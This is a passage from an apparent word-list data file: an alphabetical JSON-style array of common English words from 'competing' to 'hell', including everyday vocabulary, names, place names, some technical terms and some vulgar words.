			"competing",
			"competition",
			"competitions",
			"competitive",
			"competitors",
			"compilation",
			"compile",
			"compiled",
			"compiler",
			"complaint",
			"complaints",
			"complement",
			"complete",
			"completed",
			"completely",
			"completing",
			"completion",
			"complex",
			"complexity",
			"compliance",
			"compliant",
			"complicated",
			"complications",
			"complimentary",
			"comply",
			"component",
			"components",
			"composed",
			"composer",
			"composite",
			"composition",
			"compound",
			"compounds",
			"comprehensive",
			"compressed",
			"compression",
			"compromise",
			"computation",
			"computational",
			"compute",
			"computed",
			"computer",
			"computers",
			"computing",
			"con",
			"concentrate",
			"concentration",
			"concentrations",
			"concept",
			"concepts",
			"conceptual",
			"concern",
			"concerned",
			"concerning",
			"concerns",
			"concert",
			"concerts",
			"conclude",
			"concluded",
			"conclusion",
			"conclusions",
			"concord",
			"concrete",
			"condition",
			"conditional",
			"conditioning",
			"conditions",
			"condo",
			"condos",
			"conduct",
			"conducted",
			"conducting",
			"conf",
			"conference",
			"conferences",
			"conferencing",
			"confidence",
			"confident",
			"confidential",
			"confidentiality",
			"config",
			"configuration",
			"configure",
			"configured",
			"configuring",
			"confirm",
			"confirmation",
			"confirmed",
			"conflict",
			"conflicts",
			"confused",
			"confusion",
			"congo",
			"congratulations",
			"congress",
			"congressional",
			"conjunction",
			"connect",
			"connected",
			"connecticut",
			"connecting",
			"connection",
			"connections",
			"connectivity",
			"connector",
			"connectors",
			"cons",
			"conscious",
			"consciousness",
			"consecutive",
			"consensus",
			"consent",
			"consequence",
			"consequences",
			"consequently",
			"conservation",
			"conservative",
			"consider",
			"considerable",
			"consideration",
			"considerations",
			"considered",
			"considering",
			"considers",
			"consist",
			"consistency",
			"consistent",
			"consistently",
			"consisting",
			"consists",
			"console",
			"consoles",
			"consolidated",
			"consolidation",
			"consortium",
			"conspiracy",
			"const",
			"constant",
			"constantly",
			"constitute",
			"constitutes",
			"constitution",
			"constitutional",
			"constraint",
			"constraints",
			"construct",
			"constructed",
			"construction",
			"consult",
			"consultancy",
			"consultant",
			"consultants",
			"consultation",
			"consulting",
			"consumer",
			"consumers",
			"consumption",
			"contact",
			"contacted",
			"contacting",
			"contacts",
			"contain",
			"contained",
			"container",
			"containers",
			"containing",
			"contains",
			"contamination",
			"contemporary",
			"content",
			"contents",
			"contest",
			"contests",
			"context",
			"continent",
			"continental",
			"continually",
			"continue",
			"continued",
			"continues",
			"continuing",
			"continuity",
			"continuous",
			"continuously",
			"contract",
			"contracting",
			"contractor",
			"contractors",
			"contracts",
			"contrary",
			"contrast",
			"contribute",
			"contributed",
			"contributing",
			"contribution",
			"contributions",
			"contributor",
			"contributors",
			"control",
			"controlled",
			"controller",
			"controllers",
			"controlling",
			"controls",
			"controversial",
			"controversy",
			"convenience",
			"convenient",
			"convention",
			"conventional",
			"conventions",
			"convergence",
			"conversation",
			"conversations",
			"conversion",
			"convert",
			"converted",
			"converter",
			"convertible",
			"convicted",
			"conviction",
			"convinced",
			"cook",
			"cookbook",
			"cooked",
			"cookie",
			"cookies",
			"cooking",
			"cool",
			"cooler",
			"cooling",
			"cooper",
			"cooperation",
			"cooperative",
			"coordinate",
			"coordinated",
			"coordinates",
			"coordination",
			"coordinator",
			"cop",
			"cope",
			"copied",
			"copies",
			"copper",
			"copy",
			"copying",
			"copyright",
			"copyrighted",
			"copyrights",
			"coral",
			"cord",
			"cordless",
			"core",
			"cork",
			"corn",
			"cornell",
			"corner",
			"corners",
			"cornwall",
			"corp",
			"corporate",
			"corporation",
			"corporations",
			"corps",
			"corpus",
			"correct",
			"corrected",
			"correction",
			"corrections",
			"correctly",
			"correlation",
			"correspondence",
			"corresponding",
			"corruption",
			"cos",
			"cosmetic",
			"cosmetics",
			"cost",
			"costa",
			"costs",
			"costume",
			"costumes",
			"cottage",
			"cottages",
			"cotton",
			"could",
			"council",
			"councils",
			"counsel",
			"counseling",
			"count",
			"counted",
			"counter",
			"counters",
			"counties",
			"counting",
			"countries",
			"country",
			"counts",
			"county",
			"couple",
			"coupled",
			"couples",
			"coupon",
			"coupons",
			"courage",
			"courier",
			"course",
			"courses",
			"court",
			"courtesy",
			"courts",
			"cove",
			"cover",
			"coverage",
			"covered",
			"covering",
			"covers",
			"cow",
			"cowboy",
			"cox",
			"cp",
			"cpu",
			"cr",
			"crack",
			"cradle",
			"craft",
			"crafts",
			"craig",
			"crap",
			"craps",
			"crash",
			"crawford",
			"crazy",
			"cream",
			"create",
			"created",
			"creates",
			"creating",
			"creation",
			"creations",
			"creative",
			"creativity",
			"creator",
			"creature",
			"creatures",
			"credit",
			"credits",
			"creek",
			"crest",
			"crew",
			"cricket",
			"crime",
			"crimes",
			"criminal",
			"crisis",
			"criteria",
			"criterion",
			"critical",
			"criticism",
			"critics",
			"crm",
			"croatia",
			"crop",
			"crops",
			"cross",
			"crossing",
			"crossword",
			"crowd",
			"crown",
			"crucial",
			"crude",
			"cruise",
			"cruises",
			"cruz",
			"cry",
			"crystal",
			"cs",
			"css",
			"cst",
			"ct",
			"cu",
			"cuba",
			"cube",
			"cubic",
			"cuisine",
			"cult",
			"cultural",
			"culture",
			"cultures",
			"cum",
			"cumshot",
			"cumshots",
			"cumulative",
			"cunt",
			"cup",
			"cups",
			"cure",
			"curious",
			"currencies",
			"currency",
			"current",
			"currently",
			"curriculum",
			"cursor",
			"curtis",
			"curve",
			"curves",
			"custody",
			"custom",
			"customer",
			"customers",
			"customise",
			"customize",
			"customized",
			"customs",
			"cut",
			"cute",
			"cuts",
			"cutting",
			"cv",
			"cvs",
			"cw",
			"cyber",
			"cycle",
			"cycles",
			"cycling",
			"cylinder",
			"cyprus",
			"cz",
			"czech",
			"d",
			"da",
			"dad",
			"daddy",
			"daily",
			"dairy",
			"daisy",
			"dakota",
			"dale",
			"dallas",
			"dam",
			"damage",
			"damaged",
			"damages",
			"dame",
			"damn",
			"dan",
			"dana",
			"dance",
			"dancing",
			"danger",
			"dangerous",
			"daniel",
			"danish",
			"danny",
			"dans",
			"dare",
			"dark",
			"darkness",
			"darwin",
			"das",
			"dash",
			"dat",
			"data",
			"database",
			"databases",
			"date",
			"dated",
			"dates",
			"dating",
			"daughter",
			"daughters",
			"dave",
			"david",
			"davidson",
			"davis",
			"dawn",
			"day",
			"days",
			"dayton",
			"db",
			"dc",
			"dd",
			"ddr",
			"de",
			"dead",
			"deadline",
			"deadly",
			"deaf",
			"deal",
			"dealer",
			"dealers",
			"dealing",
			"deals",
			"dealt",
			"dealtime",
			"dean",
			"dear",
			"death",
			"deaths",
			"debate",
			"debian",
			"deborah",
			"debt",
			"debug",
			"debut",
			"dec",
			"decade",
			"decades",
			"december",
			"decent",
			"decide",
			"decided",
			"decimal",
			"decision",
			"decisions",
			"deck",
			"declaration",
			"declare",
			"declared",
			"decline",
			"declined",
			"decor",
			"decorating",
			"decorative",
			"decrease",
			"decreased",
			"dedicated",
			"dee",
			"deemed",
			"deep",
			"deeper",
			"deeply",
			"deer",
			"def",
			"default",
			"defeat",
			"defects",
			"defence",
			"defend",
			"defendant",
			"defense",
			"defensive",
			"deferred",
			"deficit",
			"define",
			"defined",
			"defines",
			"defining",
			"definitely",
			"definition",
			"definitions",
			"degree",
			"degrees",
			"del",
			"delaware",
			"delay",
			"delayed",
			"delays",
			"delegation",
			"delete",
			"deleted",
			"delhi",
			"delicious",
			"delight",
			"deliver",
			"delivered",
			"delivering",
			"delivers",
			"delivery",
			"dell",
			"delta",
			"deluxe",
			"dem",
			"demand",
			"demanding",
			"demands",
			"demo",
			"democracy",
			"democrat",
			"democratic",
			"democrats",
			"demographic",
			"demonstrate",
			"demonstrated",
			"demonstrates",
			"demonstration",
			"den",
			"denial",
			"denied",
			"denmark",
			"dennis",
			"dense",
			"density",
			"dental",
			"dentists",
			"denver",
			"deny",
			"department",
			"departmental",
			"departments",
			"departure",
			"depend",
			"dependence",
			"dependent",
			"depending",
			"depends",
			"deployment",
			"deposit",
			"deposits",
			"depot",
			"depression",
			"dept",
			"depth",
			"deputy",
			"der",
			"derby",
			"derek",
			"derived",
			"des",
			"descending",
			"describe",
			"described",
			"describes",
			"describing",
			"description",
			"descriptions",
			"desert",
			"deserve",
			"design",
			"designated",
			"designation",
			"designed",
			"designer",
			"designers",
			"designing",
			"designs",
			"desirable",
			"desire",
			"desired",
			"desk",
			"desktop",
			"desktops",
			"desperate",
			"despite",
			"destination",
			"destinations",
			"destiny",
			"destroy",
			"destroyed",
			"destruction",
			"detail",
			"detailed",
			"details",
			"detect",
			"detected",
			"detection",
			"detective",
			"detector",
			"determination",
			"determine",
			"determined",
			"determines",
			"determining",
			"detroit",
			"deutsch",
			"deutsche",
			"deutschland",
			"dev",
			"devel",
			"develop",
			"developed",
			"developer",
			"developers",
			"developing",
			"development",
			"developmental",
			"developments",
			"develops",
			"deviant",
			"deviation",
			"device",
			"devices",
			"devil",
			"devon",
			"devoted",
			"df",
			"dg",
			"dh",
			"di",
			"diabetes",
			"diagnosis",
			"diagnostic",
			"diagram",
			"dial",
			"dialog",
			"dialogue",
			"diameter",
			"diamond",
			"diamonds",
			"diana",
			"diane",
			"diary",
			"dice",
			"dick",
			"dicke",
			"dicks",
			"dictionaries",
			"dictionary",
			"did",
			"die",
			"died",
			"diego",
			"dies",
			"diesel",
			"diet",
			"dietary",
			"diff",
			"differ",
			"difference",
			"differences",
			"different",
			"differential",
			"differently",
			"difficult",
			"difficulties",
			"difficulty",
			"diffs",
			"dig",
			"digest",
			"digit",
			"digital",
			"dildo",
			"dildos",
			"dim",
			"dimension",
			"dimensional",
			"dimensions",
			"dining",
			"dinner",
			"dip",
			"diploma",
			"dir",
			"direct",
			"directed",
			"direction",
			"directions",
			"directive",
			"directly",
			"director",
			"directories",
			"directors",
			"directory",
			"dirt",
			"dirty",
			"dis",
			"disabilities",
			"disability",
			"disable",
			"disabled",
			"disagree",
			"disappointed",
			"disaster",
			"disc",
			"discharge",
			"disciplinary",
			"discipline",
			"disciplines",
			"disclaimer",
			"disclaimers",
			"disclose",
			"disclosure",
			"disco",
			"discount",
			"discounted",
			"discounts",
			"discover",
			"discovered",
			"discovery",
			"discrete",
			"discretion",
			"discrimination",
			"discs",
			"discuss",
			"discussed",
			"discusses",
			"discussing",
			"discussion",
			"discussions",
			"disease",
			"diseases",
			"dish",
			"dishes",
			"disk",
			"disks",
			"disney",
			"disorder",
			"disorders",
			"dispatch",
			"dispatched",
			"display",
			"displayed",
			"displaying",
			"displays",
			"disposal",
			"disposition",
			"dispute",
			"disputes",
			"dist",
			"distance",
			"distances",
			"distant",
			"distinct",
			"distinction",
			"distinguished",
			"distribute",
			"distributed",
			"distribution",
			"distributions",
			"distributor",
			"distributors",
			"district",
			"districts",
			"disturbed",
			"div",
			"dive",
			"diverse",
			"diversity",
			"divide",
			"divided",
			"dividend",
			"divine",
			"diving",
			"division",
			"divisions",
			"divorce",
			"divx",
			"diy",
			"dj",
			"dk",
			"dl",
			"dm",
			"dna",
			"dns",
			"do",
			"doc",
			"dock",
			"docs",
			"doctor",
			"doctors",
			"doctrine",
			"document",
			"documentary",
			"documentation",
			"documentcreatetextnode",
			"documented",
			"documents",
			"dod",
			"dodge",
			"doe",
			"does",
			"dog",
			"dogs",
			"doing",
			"doll",
			"dollar",
			"dollars",
			"dolls",
			"dom",
			"domain",
			"domains",
			"dome",
			"domestic",
			"dominant",
			"dominican",
			"don",
			"donald",
			"donate",
			"donated",
			"donation",
			"donations",
			"done",
			"donna",
			"donor",
			"donors",
			"dont",
			"doom",
			"door",
			"doors",
			"dos",
			"dosage",
			"dose",
			"dot",
			"double",
			"doubt",
			"doug",
			"douglas",
			"dover",
			"dow",
			"down",
			"download",
			"downloadable",
			"downloadcom",
			"downloaded",
			"downloading",
			"downloads",
			"downtown",
			"dozen",
			"dozens",
			"dp",
			"dpi",
			"dr",
			"draft",
			"drag",
			"dragon",
			"drain",
			"drainage",
			"drama",
			"dramatic",
			"dramatically",
			"draw",
			"drawing",
			"drawings",
			"drawn",
			"draws",
			"dream",
			"dreams",
			"dress",
			"dressed",
			"dresses",
			"dressing",
			"drew",
			"dried",
			"drill",
			"drilling",
			"drink",
			"drinking",
			"drinks",
			"drive",
			"driven",
			"driver",
			"drivers",
			"drives",
			"driving",
			"drop",
			"dropped",
			"drops",
			"drove",
			"drug",
			"drugs",
			"drum",
			"drums",
			"drunk",
			"dry",
			"dryer",
			"ds",
			"dsc",
			"dsl",
			"dt",
			"dts",
			"du",
			"dual",
			"dubai",
			"dublin",
			"duck",
			"dude",
			"due",
			"dui",
			"duke",
			"dumb",
			"dump",
			"duncan",
			"duo",
			"duplicate",
			"durable",
			"duration",
			"durham",
			"during",
			"dust",
			"dutch",
			"duties",
			"duty",
			"dv",
			"dvd",
			"dvds",
			"dx",
			"dying",
			"dylan",
			"dynamic",
			"dynamics",
			"e",
			"ea",
			"each",
			"eagle",
			"eagles",
			"ear",
			"earl",
			"earlier",
			"earliest",
			"early",
			"earn",
			"earned",
			"earning",
			"earnings",
			"earrings",
			"ears",
			"earth",
			"earthquake",
			"ease",
			"easier",
			"easily",
			"east",
			"easter",
			"eastern",
			"easy",
			"eat",
			"eating",
			"eau",
			"ebay",
			"ebony",
			"ebook",
			"ebooks",
			"ec",
			"echo",
			"eclipse",
			"eco",
			"ecological",
			"ecology",
			"ecommerce",
			"economic",
			"economics",
			"economies",
			"economy",
			"ecuador",
			"ed",
			"eddie",
			"eden",
			"edgar",
			"edge",
			"edges",
			"edinburgh",
			"edit",
			"edited",
			"editing",
			"edition",
			"editions",
			"editor",
			"editorial",
			"editorials",
			"editors",
			"edmonton",
			"eds",
			"edt",
			"educated",
			"education",
			"educational",
			"educators",
			"edward",
			"edwards",
			"ee",
			"ef",
			"effect",
			"effective",
			"effectively",
			"effectiveness",
			"effects",
			"efficiency",
			"efficient",
			"efficiently",
			"effort",
			"efforts",
			"eg",
			"egg",
			"eggs",
			"egypt",
			"egyptian",
			"eh",
			"eight",
			"either",
			"ejaculation",
			"el",
			"elder",
			"elderly",
			"elect",
			"elected",
			"election",
			"elections",
			"electoral",
			"electric",
			"electrical",
			"electricity",
			"electro",
			"electron",
			"electronic",
			"electronics",
			"elegant",
			"element",
			"elementary",
			"elements",
			"elephant",
			"elevation",
			"eleven",
			"eligibility",
			"eligible",
			"eliminate",
			"elimination",
			"elite",
			"elizabeth",
			"ellen",
			"elliott",
			"ellis",
			"else",
			"elsewhere",
			"elvis",
			"em",
			"emacs",
			"email",
			"emails",
			"embassy",
			"embedded",
			"emerald",
			"emergency",
			"emerging",
			"emily",
			"eminem",
			"emirates",
			"emission",
			"emissions",
			"emma",
			"emotional",
			"emotions",
			"emperor",
			"emphasis",
			"empire",
			"empirical",
			"employ",
			"employed",
			"employee",
			"employees",
			"employer",
			"employers",
			"employment",
			"empty",
			"en",
			"enable",
			"enabled",
			"enables",
			"enabling",
			"enb",
			"enclosed",
			"enclosure",
			"encoding",
			"encounter",
			"encountered",
			"encourage",
			"encouraged",
			"encourages",
			"encouraging",
			"encryption",
			"encyclopedia",
			"end",
			"endangered",
			"ended",
			"endif",
			"ending",
			"endless",
			"endorsed",
			"endorsement",
			"ends",
			"enemies",
			"enemy",
			"energy",
			"enforcement",
			"eng",
			"engage",
			"engaged",
			"engagement",
			"engaging",
			"engine",
			"engineer",
			"engineering",
			"engineers",
			"engines",
			"england",
			"english",
			"enhance",
			"enhanced",
			"enhancement",
			"enhancements",
			"enhancing",
			"enjoy",
			"enjoyed",
			"enjoying",
			"enlarge",
			"enlargement",
			"enormous",
			"enough",
			"enquiries",
			"enquiry",
			"enrolled",
			"enrollment",
			"ensemble",
			"ensure",
			"ensures",
			"ensuring",
			"ent",
			"enter",
			"entered",
			"entering",
			"enterprise",
			"enterprises",
			"enters",
			"entertaining",
			"entertainment",
			"entire",
			"entirely",
			"entities",
			"entitled",
			"entity",
			"entrance",
			"entrepreneur",
			"entrepreneurs",
			"entries",
			"entry",
			"envelope",
			"environment",
			"environmental",
			"environments",
			"enzyme",
			"eos",
			"ep",
			"epa",
			"epic",
			"epinions",
			"epinionscom",
			"episode",
			"episodes",
			"epson",
			"eq",
			"equal",
			"equality",
			"equally",
			"equation",
			"equations",
			"equilibrium",
			"equipment",
			"equipped",
			"equity",
			"equivalent",
			"er",
			"era",
			"eric",
			"ericsson",
			"erik",
			"erotic",
			"erotica",
			"erp",
			"error",
			"errors",
			"es",
			"escape",
			"escort",
			"escorts",
			"especially",
			"espn",
			"essay",
			"essays",
			"essence",
			"essential",
			"essentially",
			"essentials",
			"essex",
			"est",
			"establish",
			"established",
			"establishing",
			"establishment",
			"estate",
			"estates",
			"estimate",
			"estimated",
			"estimates",
			"estimation",
			"estonia",
			"et",
			"etc",
			"eternal",
			"ethernet",
			"ethical",
			"ethics",
			"ethiopia",
			"ethnic",
			"eu",
			"eugene",
			"eur",
			"euro",
			"europe",
			"european",
			"euros",
			"ev",
			"eva",
			"eval",
			"evaluate",
			"evaluated",
			"evaluating",
			"evaluation",
			"evaluations",
			"evanescence",
			"evans",
			"eve",
			"even",
			"evening",
			"event",
			"events",
			"eventually",
			"ever",
			"every",
			"everybody",
			"everyday",
			"everyone",
			"everything",
			"everywhere",
			"evidence",
			"evident",
			"evil",
			"evolution",
			"ex",
			"exact",
			"exactly",
			"exam",
			"examination",
			"examinations",
			"examine",
			"examined",
			"examines",
			"examining",
			"example",
			"examples",
			"exams",
			"exceed",
			"excel",
			"excellence",
			"excellent",
			"except",
			"exception",
			"exceptional",
			"exceptions",
			"excerpt",
			"excess",
			"excessive",
			"exchange",
			"exchanges",
			"excited",
			"excitement",
			"exciting",
			"exclude",
			"excluded",
			"excluding",
			"exclusion",
			"exclusive",
			"exclusively",
			"excuse",
			"exec",
			"execute",
			"executed",
			"execution",
			"executive",
			"executives",
			"exempt",
			"exemption",
			"exercise",
			"exercises",
			"exhaust",
			"exhibit",
			"exhibition",
			"exhibitions",
			"exhibits",
			"exist",
			"existed",
			"existence",
			"existing",
			"exists",
			"exit",
			"exotic",
			"exp",
			"expand",
			"expanded",
			"expanding",
			"expansion",
			"expansys",
			"expect",
			"expectations",
			"expected",
			"expects",
			"expedia",
			"expenditure",
			"expenditures",
			"expense",
			"expenses",
			"expensive",
			"experience",
			"experienced",
			"experiences",
			"experiencing",
			"experiment",
			"experimental",
			"experiments",
			"expert",
			"expertise",
			"experts",
			"expiration",
			"expired",
			"expires",
			"explain",
			"explained",
			"explaining",
			"explains",
			"explanation",
			"explicit",
			"explicitly",
			"exploration",
			"explore",
			"explorer",
			"exploring",
			"explosion",
			"expo",
			"export",
			"exports",
			"exposed",
			"exposure",
			"express",
			"expressed",
			"expression",
			"expressions",
			"ext",
			"extend",
			"extended",
			"extending",
			"extends",
			"extension",
			"extensions",
			"extensive",
			"extent",
			"exterior",
			"external",
			"extra",
			"extract",
			"extraction",
			"extraordinary",
			"extras",
			"extreme",
			"extremely",
			"eye",
			"eyed",
			"eyes",
			"ez",
			"f",
			"fa",
			"fabric",
			"fabrics",
			"fabulous",
			"face",
			"faced",
			"faces",
			"facial",
			"facilitate",
			"facilities",
			"facility",
			"facing",
			"fact",
			"factor",
			"factors",
			"factory",
			"facts",
			"faculty",
			"fail",
			"failed",
			"failing",
			"fails",
			"failure",
			"failures",
			"fair",
			"fairfield",
			"fairly",
			"fairy",
			"faith",
			"fake",
			"fall",
			"fallen",
			"falling",
			"falls",
			"false",
			"fame",
			"familiar",
			"families",
			"family",
			"famous",
			"fan",
			"fancy",
			"fans",
			"fantastic",
			"fantasy",
			"faq",
			"faqs",
			"far",
			"fare",
			"fares",
			"farm",
			"farmer",
			"farmers",
			"farming",
			"farms",
			"fascinating",
			"fashion",
			"fast",
			"faster",
			"fastest",
			"fat",
			"fatal",
			"fate",
			"father",
			"fathers",
			"fatty",
			"fault",
			"favor",
			"favorite",
			"favorites",
			"favors",
			"favour",
			"favourite",
			"favourites",
			"fax",
			"fbi",
			"fc",
			"fcc",
			"fd",
			"fda",
			"fe",
			"fear",
			"fears",
			"feat",
			"feature",
			"featured",
			"features",
			"featuring",
			"feb",
			"february",
			"fed",
			"federal",
			"federation",
			"fee",
			"feed",
			"feedback",
			"feeding",
			"feeds",
			"feel",
			"feeling",
			"feelings",
			"feels",
			"fees",
			"feet",
			"fell",
			"fellow",
			"fellowship",
			"felt",
			"female",
			"females",
			"fence",
			"feof",
			"ferrari",
			"ferry",
			"festival",
			"festivals",
			"fetish",
			"fever",
			"few",
			"fewer",
			"ff",
			"fg",
			"fi",
			"fiber",
			"fibre",
			"fiction",
			"field",
			"fields",
			"fifteen",
			"fifth",
			"fifty",
			"fig",
			"fight",
			"fighter",
			"fighters",
			"fighting",
			"figure",
			"figured",
			"figures",
			"fiji",
			"file",
			"filed",
			"filename",
			"files",
			"filing",
			"fill",
			"filled",
			"filling",
			"film",
			"filme",
			"films",
			"filter",
			"filtering",
			"filters",
			"fin",
			"final",
			"finally",
			"finals",
			"finance",
			"finances",
			"financial",
			"financing",
			"find",
			"findarticles",
			"finder",
			"finding",
			"findings",
			"findlaw",
			"finds",
			"fine",
			"finest",
			"finger",
			"fingering",
			"fingers",
			"finish",
			"finished",
			"finishing",
			"finite",
			"finland",
			"finnish",
			"fioricet",
			"fire",
			"fired",
			"firefox",
			"fireplace",
			"fires",
			"firewall",
			"firewire",
			"firm",
			"firms",
			"firmware",
			"first",
			"fiscal",
			"fish",
			"fisher",
			"fisheries",
			"fishing",
			"fist",
			"fisting",
			"fit",
			"fitness",
			"fits",
			"fitted",
			"fitting",
			"five",
			"fix",
			"fixed",
			"fixes",
			"fixtures",
			"fl",
			"fla",
			"flag",
			"flags",
			"flame",
			"flash",
			"flashers",
			"flashing",
			"flat",
			"flavor",
			"fleece",
			"fleet",
			"flesh",
			"flex",
			"flexibility",
			"flexible",
			"flickr",
			"flight",
			"flights",
			"flip",
			"float",
			"floating",
			"flood",
			"floor",
			"flooring",
			"floors",
			"floppy",
			"floral",
			"florence",
			"florida",
			"florist",
			"florists",
			"flour",
			"flow",
			"flower",
			"flowers",
			"flows",
			"floyd",
			"flu",
			"fluid",
			"flush",
			"flux",
			"fly",
			"flyer",
			"flying",
			"fm",
			"fo",
			"foam",
			"focal",
			"focus",
			"focused",
			"focuses",
			"focusing",
			"fog",
			"fold",
			"folder",
			"folders",
			"folding",
			"folk",
			"folks",
			"follow",
			"followed",
			"following",
			"follows",
			"font",
			"fonts",
			"foo",
			"food",
			"foods",
			"fool",
			"foot",
			"footage",
			"football",
			"footwear",
			"for",
			"forbes",
			"forbidden",
			"force",
			"forced",
			"forces",
			"ford",
			"forecast",
			"forecasts",
			"foreign",
			"forest",
			"forestry",
			"forests",
			"forever",
			"forge",
			"forget",
			"forgot",
			"forgotten",
			"fork",
			"form",
			"formal",
			"format",
			"formation",
			"formats",
			"formatting",
			"formed",
			"former",
			"formerly",
			"forming",
			"forms",
			"formula",
			"fort",
			"forth",
			"fortune",
			"forty",
			"forum",
			"forums",
			"forward",
			"forwarding",
			"fossil",
			"foster",
			"foto",
			"fotos",
			"fought",
			"foul",
			"found",
			"foundation",
			"foundations",
			"founded",
			"founder",
			"fountain",
			"four",
			"fourth",
			"fox",
			"fp",
			"fr",
			"fraction",
			"fragrance",
			"fragrances",
			"frame",
			"framed",
			"frames",
			"framework",
			"framing",
			"france",
			"franchise",
			"francis",
			"francisco",
			"frank",
			"frankfurt",
			"franklin",
			"fraser",
			"fraud",
			"fred",
			"frederick",
			"free",
			"freebsd",
			"freedom",
			"freelance",
			"freely",
			"freeware",
			"freeze",
			"freight",
			"french",
			"frequencies",
			"frequency",
			"frequent",
			"frequently",
			"fresh",
			"fri",
			"friday",
			"fridge",
			"friend",
			"friendly",
			"friends",
			"friendship",
			"frog",
			"from",
			"front",
			"frontier",
			"frontpage",
			"frost",
			"frozen",
			"fruit",
			"fruits",
			"fs",
			"ft",
			"ftp",
			"fu",
			"fuck",
			"fucked",
			"fucking",
			"fuel",
			"fuji",
			"fujitsu",
			"full",
			"fully",
			"fun",
			"function",
			"functional",
			"functionality",
			"functioning",
			"functions",
			"fund",
			"fundamental",
			"fundamentals",
			"funded",
			"funding",
			"fundraising",
			"funds",
			"funeral",
			"funk",
			"funky",
			"funny",
			"fur",
			"furnished",
			"furnishings",
			"furniture",
			"further",
			"furthermore",
			"fusion",
			"future",
			"futures",
			"fuzzy",
			"fw",
			"fwd",
			"fx",
			"fy",
			"g",
			"ga",
			"gabriel",
			"gadgets",
			"gage",
			"gain",
			"gained",
			"gains",
			"galaxy",
			"gale",
			"galleries",
			"gallery",
			"gambling",
			"game",
			"gamecube",
			"games",
			"gamespot",
			"gaming",
			"gamma",
			"gang",
			"gangbang",
			"gap",
			"gaps",
			"garage",
			"garbage",
			"garcia",
			"garden",
			"gardening",
			"gardens",
			"garlic",
			"garmin",
			"gary",
			"gas",
			"gasoline",
			"gate",
			"gates",
			"gateway",
			"gather",
			"gathered",
			"gathering",
			"gauge",
			"gave",
			"gay",
			"gays",
			"gazette",
			"gb",
			"gba",
			"gbp",
			"gc",
			"gcc",
			"gd",
			"gdp",
			"ge",
			"gear",
			"geek",
			"gel",
			"gem",
			"gen",
			"gender",
			"gene",
			"genealogy",
			"general",
			"generally",
			"generate",
			"generated",
			"generates",
			"generating",
			"generation",
			"generations",
			"generator",
			"generators",
			"generic",
			"generous",
			"genes",
			"genesis",
			"genetic",
			"genetics",
			"geneva",
			"genius",
			"genome",
			"genre",
			"genres",
			"gentle",
			"gentleman",
			"gently",
			"genuine",
			"geo",
			"geographic",
			"geographical",
			"geography",
			"geological",
			"geology",
			"geometry",
			"george",
			"georgia",
			"gerald",
			"german",
			"germany",
			"get",
			"gets",
			"getting",
			"gg",
			"ghana",
			"ghost",
			"ghz",
			"gi",
			"giant",
			"giants",
			"gibraltar",
			"gibson",
			"gif",
			"gift",
			"gifts",
			"gig",
			"gilbert",
			"girl",
			"girlfriend",
			"girls",
			"gis",
			"give",
			"given",
			"gives",
			"giving",
			"gl",
			"glad",
			"glance",
			"glasgow",
			"glass",
			"glasses",
			"glen",
			"glenn",
			"global",
			"globe",
			"glory",
			"glossary",
			"gloves",
			"glow",
			"glucose",
			"gm",
			"gmbh",
			"gmc",
			"gmt",
			"gnome",
			"gnu",
			"go",
			"goal",
			"goals",
			"goat",
			"god",
			"gods",
			"goes",
			"going",
			"gold",
			"golden",
			"golf",
			"gone",
			"gonna",
			"good",
			"goods",
			"google",
			"gordon",
			"gore",
			"gorgeous",
			"gospel",
			"gossip",
			"got",
			"gothic",
			"goto",
			"gotta",
			"gotten",
			"gourmet",
			"gov",
			"governance",
			"governing",
			"government",
			"governmental",
			"governments",
			"governor",
			"govt",
			"gp",
			"gpl",
			"gps",
			"gr",
			"grab",
			"grace",
			"grad",
			"grade",
			"grades",
			"gradually",
			"graduate",
			"graduated",
			"graduates",
			"graduation",
			"graham",
			"grain",
			"grammar",
			"grams",
			"grand",
			"grande",
			"granny",
			"grant",
			"granted",
			"grants",
			"graph",
			"graphic",
			"graphical",
			"graphics",
			"graphs",
			"gras",
			"grass",
			"grateful",
			"gratis",
			"gratuit",
			"grave",
			"gravity",
			"gray",
			"great",
			"greater",
			"greatest",
			"greatly",
			"greece",
			"greek",
			"green",
			"greene",
			"greenhouse",
			"greensboro",
			"greeting",
			"greetings",
			"greg",
			"gregory",
			"grenada",
			"grew",
			"grey",
			"grid",
			"griffin",
			"grill",
			"grip",
			"grocery",
			"groove",
			"gross",
			"ground",
			"grounds",
			"groundwater",
			"group",
			"groups",
			"grove",
			"grow",
			"growing",
			"grown",
			"grows",
			"growth",
			"gs",
			"gsm",
			"gst",
			"gt",
			"gtk",
			"guam",
			"guarantee",
			"guaranteed",
			"guarantees",
			"guard",
			"guardian",
			"guards",
			"guatemala",
			"guess",
			"guest",
			"guestbook",
			"guests",
			"gui",
			"guidance",
			"guide",
			"guided",
			"guidelines",
			"guides",
			"guild",
			"guilty",
			"guinea",
			"guitar",
			"guitars",
			"gulf",
			"gun",
			"guns",
			"guru",
			"guy",
			"guyana",
			"guys",
			"gym",
			"gzip",
			"h",
			"ha",
			"habitat",
			"habits",
			"hack",
			"hacker",
			"had",
			"hair",
			"hairy",
			"haiti",
			"half",
			"halfcom",
			"halifax",
			"hall",
			"halloween",
			"halo",
			"ham",
			"hamburg",
			"hamilton",
			"hammer",
			"hampshire",
			"hampton",
			"hand",
			"handbags",
			"handbook",
			"handed",
			"handheld",
			"handhelds",
			"handjob",
			"handjobs",
			"handle",
			"handled",
			"handles",
			"handling",
			"handmade",
			"hands",
			"handy",
			"hang",
			"hanging",
			"hans",
			"hansen",
			"happen",
			"happened",
			"happening",
			"happens",
			"happiness",
			"happy",
			"harassment",
			"harbor",
			"harbour",
			"hard",
			"hardcore",
			"hardcover",
			"harder",
			"hardly",
			"hardware",
			"hardwood",
			"harley",
			"harm",
			"harmful",
			"harmony",
			"harold",
			"harper",
			"harris",
			"harrison",
			"harry",
			"hart",
			"hartford",
			"harvard",
			"harvest",
			"harvey",
			"has",
			"hash",
			"hat",
			"hate",
			"hats",
			"have",
			"haven",
			"having",
			"hawaii",
			"hawaiian",
			"hawk",
			"hay",
			"hayes",
			"hazard",
			"hazardous",
			"hazards",
			"hb",
			"hc",
			"hd",
			"hdtv",
			"he",
			"head",
			"headed",
			"header",
			"headers",
			"heading",
			"headline",
			"headlines",
			"headphones",
			"headquarters",
			"heads",
			"headset",
			"healing",
			"health",
			"healthcare",
			"healthy",
			"hear",
			"heard",
			"hearing",
			"hearings",
			"heart",
			"hearts",
			"heat",
			"heated",
			"heater",
			"heath",
			"heather",
			"heating",
			"heaven",
			"heavily",
			"heavy",
			"hebrew",
			"heel",
			"height",
			"heights",
			"held",
			"helen",
			"helena",
			"helicopter",
			"hell",
